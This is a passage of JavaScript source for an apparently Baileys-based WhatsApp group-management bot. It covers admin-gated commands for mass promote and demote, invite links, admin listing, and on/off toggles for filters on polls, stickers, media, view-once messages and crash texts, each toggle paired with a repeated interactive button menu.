 await VeranBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcveran(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return VeranStickGroup()
 if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
 if (!m.isBotAdmin) return VeranStickBotAdmin()
  const verandemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of verandemoteall) {
 await VeranBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcveran(`Success`);
}
break
			case 'ephemeral': {
                if (!m.isGroup) return VeranStickGroup()
                if (!m.isBotAdmin) return VeranStickBotAdmin()
                if (!m.isAdmin) return VeranStickAdmin()
                if (args[0] === 'on') {
                    await VeranBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcveran(`Done`)
                } else if (args[0] === 'off') {
                    await VeranBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcveran(`Done`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
			case 'invite': {
	if (!m.isGroup) return VeranStickGroup()
	if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!text) return replygcveran(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2347082664317`)
if (text.includes('+')) return replygcveran(`Enter the number together without *+*`)
if (isNaN(text)) return replygcveran(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await VeranBotInc.groupInviteCode(group)
      await VeranBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcveran(` An invite link is sent to the user`) 
}
break
			case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return VeranStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
   
}
break
			case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':{
                if (!m.isGroup) return VeranStickGroup()
                if (!m.isAdmin && !isGroupOwner && !VeranTheCreator) return VeranStickAdmin()
                if (!m.isBotAdmin) return VeranStickBotAdmin()
                let response = await VeranBotInc.groupInviteCode(m.chat)
                VeranBotInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                }
            break
			case 'antipoll':{
            	if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antipoll = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antipoll = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antisticker = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antisticker = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antiimage = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiimage = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antivideo = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antivideo = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivirtex': case 'antivirus':{
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antivirtex = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antivirtex = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'unavailable':
                if (!VeranTheCreator) return VeranStickOwner()
                if (q === 'on') {
                    db.settings[botNumber].online = true
                    replygcveran(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].online = false
                    replygcveran(`Successfully changed unavailable to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			      case 'welcome':
            case 'left': {
               if (!m.isGroup) return VeranStickGroup()
               if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].welcome = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].welcome = false
                  replygcveran(`${command} is disabled`)
               }else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'groupevent': {
               if (!m.isGroup) return VeranStickGroup()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].setinfo = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].setinfo = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
			case 'antivv': case 'antiviewonce': {
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antiviewonce = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiviewonce = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antimedia = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antimedia = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antidocument = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antidocument = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
         
               if (args[0] === 'on') {
                  db.groups[m.chat].anticontact = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].anticontact = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
